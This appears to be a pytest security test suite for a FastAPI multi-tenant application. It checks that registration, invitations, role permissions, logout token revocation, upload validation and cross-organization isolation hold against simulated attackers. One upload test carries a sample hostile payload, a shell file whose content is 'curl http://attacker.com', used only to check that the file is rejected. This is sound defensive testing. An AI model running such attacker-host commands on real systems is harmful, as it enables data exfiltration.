import uuid
import pytest
from fastapi.testclient import TestClient
from app.main import app

client = TestClient(app)

def test_public_registration_prevents_unauthorized_org_join():
    """Verify that registering with an existing organization name is rejected."""
    uid = uuid.uuid4().hex[:6]
    org_name = f"Alpha Corp {uid}"
    
    # 1. Register Org Alpha
    res1 = client.post("/api/v1/auth/register", json={
        "email": f"alpha_owner_{uid}@alpha.com",
        "password": "StrongPassword123!",
        "full_name": "Alpha Owner",
        "organization_name": org_name
    })
    assert res1.status_code == 200
    user1 = res1.json()["user"]
    assert user1["role"] == "Administrator"

    # 2. Attacker attempts to register with same org name to gain unauthorized access
    res2 = client.post("/api/v1/auth/register", json={
        "email": f"attacker_{uid}@other.com",
        "password": "StrongPassword123!",
        "full_name": "Attacker",
        "organization_name": org_name
    })
    assert res2.status_code == 400
    assert "already exists" in res2.json()["detail"].lower()

def test_invitation_flow_and_membership():
    """Verify invitation creation by Admin and joining via invitation token."""
    uid = uuid.uuid4().hex[:6]
    # Register org
    reg = client.post("/api/v1/auth/register", json={
        "email": f"owner_{uid}@org.com",
        "password": "StrongPassword123!",
        "full_name": "Org Owner",
        "organization_name": f"Invite Org {uid}"
    }).json()
    token = reg["access_token"]
    headers = {"Authorization": f"Bearer {token}"}
    from app.database import SessionLocal
    from app.services.billing_service import BillingService
    _db = SessionLocal()
    try:
        BillingService.change_subscription_plan(_db, reg["user"]["org_id"], "starter")
    finally:
        _db.close()

    # Admin creates invitation for Developer
    invite_resp = client.post("/api/v1/auth/invitations", headers=headers, json={
        "email": f"new_dev_{uid}@org.com",
        "role": "Developer"
    })
    assert invite_resp.status_code == 201
    invite_data = invite_resp.json()
    invite_token = invite_data["token"]
    assert invite_data["role"] == "Developer"

    # Invitee accepts invitation
    accept_resp = client.post("/api/v1/auth/accept-invitation", json={
        "token": invite_token,
        "full_name": "Alice Developer",
        "password": "DevPassword123!"
    })
    assert accept_resp.status_code == 200
    new_user = accept_resp.json()["user"]
    assert new_user["email"] == f"new_dev_{uid}@org.com"
    assert new_user["role"] == "Developer"
    assert new_user["org_id"] == reg["user"]["org_id"]

def test_cross_organization_data_isolation():
    """Verify that Org A cannot view, modify or delete Org B projects or assessments."""
    uid_a = uuid.uuid4().hex[:6]
    uid_b = uuid.uuid4().hex[:6]

    # 1. Register Org Beta
    res_beta = client.post("/api/v1/auth/register", json={
        "email": f"beta_admin_{uid_b}@beta.com",
        "password": "StrongPassword123!",
        "full_name": "Beta Admin",
        "organization_name": f"Beta Enterprises {uid_b}"
    }).json()
    beta_token = res_beta["access_token"]
    beta_headers = {"Authorization": f"Bearer {beta_token}"}

    # Create project in Beta
    p_resp = client.post("/api/v1/projects", headers=beta_headers, json={
        "name": "Beta Secret Project",
        "description": "Proprietary code"
    }).json()
    beta_proj_id = p_resp["id"]

    # 2. Register Org Alpha
    res_alpha = client.post("/api/v1/auth/register", json={
        "email": f"alpha_owner_{uid_a}@alpha.com",
        "password": "StrongPassword123!",
        "full_name": "Alpha Owner",
        "organization_name": f"Alpha Corp {uid_a}"
    }).json()
    alpha_token = res_alpha["access_token"]
    alpha_headers = {"Authorization": f"Bearer {alpha_token}"}

    # Alpha attempts to get Beta's project -> 404
    get_cross = client.get(f"/api/v1/projects/{beta_proj_id}", headers=alpha_headers)
    assert get_cross.status_code == 404

    # Alpha attempts to delete Beta's project -> 404
    del_cross = client.delete(f"/api/v1/projects/{beta_proj_id}", headers=alpha_headers)
    assert del_cross.status_code == 404

    # Alpha attempts to run assessment on Beta's project -> 404
    assess_cross = client.post("/api/v1/assessments/run", headers=alpha_headers, json={
        "project_id": beta_proj_id
    })
    assert assess_cross.status_code == 404

def test_rbac_restrictions():
    """Verify role-based access control restrictions."""
    uid = uuid.uuid4().hex[:6]
    # Register org
    reg = client.post("/api/v1/auth/register", json={
        "email": f"owner_{uid}@rbac.com",
        "password": "StrongPassword123!",
        "full_name": "Owner",
        "organization_name": f"RBAC Org {uid}"
    }).json()
    admin_token = reg["access_token"]
    admin_headers = {"Authorization": f"Bearer {admin_token}"}
    from app.database import SessionLocal
    from app.services.billing_service import BillingService
    _db = SessionLocal()
    try:
        BillingService.change_subscription_plan(_db, reg["user"]["org_id"], "starter")
    finally:
        _db.close()

    # Invite Developer
    invite = client.post("/api/v1/auth/invitations", headers=admin_headers, json={
        "email": f"dev_{uid}@rbac.com",
        "role": "Developer"
    }).json()

    # Developer joins
    dev_join = client.post("/api/v1/auth/accept-invitation", json={
        "token": invite["token"],
        "full_name": "Dev User",
        "password": "Password123!"
    }).json()
    dev_token = dev_join["access_token"]
    dev_headers = {"Authorization": f"Bearer {dev_token}"}

    # Developer attempts to update integration credentials (Administrator only)
    setting_resp = client.post("/api/v1/settings", headers=dev_headers, json={
        "firecrawl_api_key": "fc-malicious-key"
    })
    assert setting_resp.status_code == 403

    # Developer attempts to create an invitation (Admin/Manager only)
    invite_resp = client.post("/api/v1/auth/invitations", headers=dev_headers, json={
        "email": f"other_{uid}@rbac.com",
        "role": "Administrator"
    })
    assert invite_resp.status_code == 403

def test_token_revocation_on_logout():
    """Verify that logging out revokes the JWT session."""
    uid = uuid.uuid4().hex[:6]
    reg = client.post("/api/v1/auth/register", json={
        "email": f"logout_user_{uid}@test.com",
        "password": "Password123!",
        "full_name": "Logout Tester",
        "organization_name": f"Logout Org {uid}"
    }).json()
    token = reg["access_token"]
    headers = {"Authorization": f"Bearer {token}"}
    from app.database import SessionLocal
    from app.services.billing_service import BillingService
    _db = SessionLocal()
    try:
        BillingService.change_subscription_plan(_db, reg["user"]["org_id"], "starter")
    finally:
        _db.close()

    # Verify authenticated call succeeds
    me_resp = client.get("/api/v1/auth/me", headers=headers)
    assert me_resp.status_code == 200

    # Call logout
    logout_resp = client.post("/api/v1/auth/logout", headers=headers)
    assert logout_resp.status_code == 200

    # Subsequent call with the same token must fail with 401
    me_after = client.get("/api/v1/auth/me", headers=headers)
    assert me_after.status_code == 401
    assert "revoked" in me_after.json()["detail"].lower()

def test_file_upload_validation():
    """Verify file size, extension and null byte validation."""
    uid = uuid.uuid4().hex[:6]
    reg = client.post("/api/v1/auth/register", json={
        "email": f"upload_user_{uid}@test.com",
        "password": "Password123!",
        "full_name": "Upload Tester",
        "organization_name": f"Upload Org {uid}"
    }).json()
    token = reg["access_token"]
    headers = {"Authorization": f"Bearer {token}"}
    from app.database import SessionLocal
    from app.services.billing_service import BillingService
    _db = SessionLocal()
    try:
        BillingService.change_subscription_plan(_db, reg["user"]["org_id"], "starter")
    finally:
        _db.close()

    # Create project in Alpha
    p = client.post("/api/v1/projects", headers=headers, json={"name": "Alpha Upload Test"}).json()
    proj_id = p["id"]

    # 1. Disallowed extension (.exe / .sh)
    bad_ext = client.post("/api/v1/technologies/import", headers=headers, json={
        "project_id": proj_id,
        "file_name": "malicious_script.sh",
        "content": "curl http://attacker.com"
    })
    assert bad_ext.status_code == 400
    assert "unsupported file format" in bad_ext.json()["detail"].lower()

    # 2. Binary content with null bytes
    binary_content = "package {\x00\x01\x02}"
    bad_bin = client.post("/api/v1/technologies/import", headers=headers, json={
        "project_id": proj_id,
        "file_name": "package.json",
        "content": binary_content
    })
    assert bad_bin.status_code == 400
    assert "null bytes" in bad_bin.json()["detail"].lower()

    # 3. File exceeding size limit (> 2MB)
    huge_content = "a" * (2 * 1024 * 1024 + 100)
    bad_size = client.post("/api/v1/technologies/import", headers=headers, json={
        "project_id": proj_id,
        "file_name": "requirements.txt",
        "content": huge_content
    })
    assert bad_size.status_code in [400, 413]

def test_privilege_escalation_prevention():
    """Verify that Engineering Managers cannot invite Administrators, and tokens are stored hashed."""
    uid = uuid.uuid4().hex[:6]
    # 1. Register Org
    admin_reg = client.post("/api/v1/auth/register", json={
        "email": f"super_admin_{uid}@corp.com",
        "password": "Password123!",
        "full_name": "Super Admin",
        "organization_name": f"Privilege Org {uid}"
    }).json()
    admin_headers = {"Authorization": f"Bearer {admin_reg['access_token']}"}
    from app.database import SessionLocal
    from app.services.billing_service import BillingService
    _db = SessionLocal()
    try:
        BillingService.change_subscription_plan(_db, admin_reg["user"]["org_id"], "starter")
    finally:
        _db.close()

    # 2. Admin invites an Engineering Manager
    inv = client.post("/api/v1/auth/invitations", headers=admin_headers, json={
        "email": f"manager_{uid}@corp.com",
        "role": "Engineering Manager"
    }).json()
    mgr_raw_token = inv["token"]

    # Manager accepts invitation
    mgr_acc = client.post("/api/v1/auth/accept-invitation", json={
        "token": mgr_raw_token,
        "full_name": "Bob Manager",
        "password": "Password123!"
    }).json()
    mgr_headers = {"Authorization": f"Bearer {mgr_acc['access_token']}"}

    # 3. Manager tries to invite an Administrator -> MUST BE 403 FORBIDDEN!
    esc_resp1 = client.post("/api/v1/auth/invitations", headers=mgr_headers, json={
        "email": f"escalated_admin_{uid}@corp.com",
        "role": "Administrator"
    })
    assert esc_resp1.status_code == 403
    assert "privilege escalation" in esc_resp1.json()["detail"].lower()

    # 4. Manager tries to invite another Engineering Manager -> MUST BE 403 FORBIDDEN!
    esc_resp2 = client.post("/api/v1/auth/invitations", headers=mgr_headers, json={
        "email": f"peer_mgr_{uid}@corp.com",
        "role": "Engineering Manager"
    })
    assert esc_resp2.status_code == 403

    # 5. Manager invites a Developer -> Allowed
    dev_inv = client.post("/api/v1/auth/invitations", headers=mgr_headers, json={
        "email": f"allowed_dev_{uid}@corp.com",
        "role": "Developer"
    })
    assert dev_inv.status_code == 201
    dev_token = dev_inv.json()["token"]

    # 6. Verify single-use validation
    acc1 = client.post("/api/v1/auth/accept-invitation", json={
        "token": dev_token,
        "full_name": "Charlie Dev",
        "password": "Password123!"
    })
    assert acc1.status_code == 200

    # Second accept attempt must fail (single-use enforced)
    acc2 = client.post("/api/v1/auth/accept-invitation", json={
        "token": dev_token,
        "full_name": "Charlie Dev Again",
        "password": "Password123!"
    })
    assert acc2.status_code == 400
    assert "already accepted" in acc2.json()["detail"].lower() or "invalid" in acc2.json()["detail"].lower()

def test_organization_integration_isolation():
    """Verify that credentials saved by Org A are completely inaccessible to Org B."""
    uid = uuid.uuid4().hex[:6]
    # Org A
    org_a = client.post("/api/v1/auth/register", json={
        "email": f"admin_a_{uid}@orga.com",
        "password": "Password123!",
        "full_name": "Admin A",
        "organization_name": f"Org A {uid}"
    }).json()
    headers_a = {"Authorization": f"Bearer {org_a['access_token']}"}

    # Org B
    org_b = client.post("/api/v1/auth/register", json={
        "email": f"admin_b_{uid}@orgb.com",
        "password": "Password123!",
        "full_name": "Admin B",
        "organization_name": f"Org B {uid}"
    }).json()
    headers_b = {"Authorization": f"Bearer {org_b['access_token']}"}

    # Org A configures secret API keys
    update_a = client.post("/api/v1/settings", headers=headers_a, json={
        "firecrawl_api_key": "fc-secret-key-for-org-a-only",
        "gemini_api_key": "gem-secret-key-for-org-a-only"
    })
    assert update_a.status_code == 200

    # Org A verifies settings: configured = True
    settings_a = client.get("/api/v1/settings", headers=headers_a).json()
    assert settings_a["firecrawl_configured"] is True
    assert settings_a["gemini_configured"] is True

    # Org B checks settings: MUST NOT have Org A's keys configured!
    settings_b = client.get("/api/v1/settings", headers=headers_b).json()
    assert settings_b["firecrawl_configured"] is False
    assert settings_b["gemini_configured"] is False

def test_organization_technology_catalog_visibility():
    """Verify that Org B cannot see technologies belonging exclusively to Org A's projects."""
    uid = uuid.uuid4().hex[:6]
    # Org A
    org_a = client.post("/api/v1/auth/register", json={
        "email": f"cat_admin_a_{uid}@catalog.com",
        "password": "Password123!",
        "full_name": "Admin A",
        "organization_name": f"Catalog Org A {uid}"
    }).json()
    headers_a = {"Authorization": f"Bearer {org_a['access_token']}"}

    # Org B
    org_b = client.post("/api/v1/auth/register", json={
        "email": f"cat_admin_b_{uid}@catalog.com",
        "password": "Password123!",
        "full_name": "Admin B",
        "organization_name": f"Catalog Org B {uid}"
    }).json()
    headers_b = {"Authorization": f"Bearer {org_b['access_token']}"}

    # Org A creates a project and adds a unique technology
    p_a = client.post("/api/v1/projects", headers=headers_a, json={"name": f"Project A {uid}"}).json()
    tech_a = client.post("/api/v1/technologies", headers=headers_a, json={
        "project_id": p_a["id"],
        "name": f"secret-internal-lib-{uid}",
        "ecosystem": "npm",
        "category": "Security"
    }).json()
    assert tech_a["name"] == f"secret-internal-lib-{uid}"

    # Org B queries technology catalog
    catalog_b = client.get("/api/v1/technologies", headers=headers_b).json()
    org_b_tech_names = [t["name"] for t in catalog_b]
    assert f"secret-internal-lib-{uid}" not in org_b_tech_names

def test_exhaustive_cross_organization_negative_authorization():
    """
    Exhaustive negative authorization test:
    Verify that Org A is strictly rejected (404/403) when attempting to access Org B's:
    1. Reports
    2. Scheduled Reviews
    3. Review Jobs
    4. Risk Findings
    5. Project Assessments
    """
    uid_a = uuid.uuid4().hex[:6]
    uid_b = uuid.uuid4().hex[:6]

    # Register Org B and create resources
    res_b = client.post("/api/v1/auth/register", json={
        "email": f"owner_b_{uid_b}@target.com",
        "password": "Password123!",
        "full_name": "Target Owner",
        "organization_name": f"Target Org {uid_b}"
    }).json()
    headers_b = {"Authorization": f"Bearer {res_b['access_token']}"}

    proj_b = client.post("/api/v1/projects", headers=headers_b, json={
        "name": f"Protected Proj {uid_b}",
        "description": "Sensitive infrastructure"
    }).json()
    proj_b_id = proj_b["id"]

    # Create schedule in Org B
    sched_b_resp = client.post("/api/v1/scheduler", headers=headers_b, json={
        "project_id": proj_b_id,
        "frequency": "Weekly",
        "cron_expression": "0 0 * * 1"
    })
    assert sched_b_resp.status_code == 201
    sched_b = sched_b_resp.json()
    sched_b_id = sched_b["id"]

    # Register Org A (Attacker)
    res_a = client.post("/api/v1/auth/register", json={
        "email": f"attacker_a_{uid_a}@attacker.com",
        "password": "Password123!",
        "full_name": "Attacker A",
        "organization_name": f"Attacker Org {uid_a}"
    }).json()
    headers_a = {"Authorization": f"Bearer {res_a['access_token']}"}

    # 1. Attacker attempts to create schedule for Org B's project -> 404
    cross_sched_create = client.post("/api/v1/scheduler", headers=headers_a, json={
        "project_id": proj_b_id,
        "frequency": "Daily",
        "cron_expression": "0 0 * * *"
    })
    assert cross_sched_create.status_code == 404

    # 2. Attacker attempts to toggle/delete Org B's schedule -> 404
    cross_sched_del = client.delete(f"/api/v1/scheduler/{sched_b_id}", headers=headers_a)
    assert cross_sched_del.status_code == 404

    # 3. Attacker attempts to generate report for Org B's project -> 404
    cross_report_gen = client.post(f"/api/v1/reports/projects/{proj_b_id}/generate", headers=headers_a, json={
        "format": "markdown"
    })
    assert cross_report_gen.status_code == 404

    # 4. Attacker attempts to fetch executive summary for Org B's project -> 404
    cross_report_get = client.get(f"/api/v1/reports/projects/{proj_b_id}/executive-summary", headers=headers_a)
    assert cross_report_get.status_code == 404
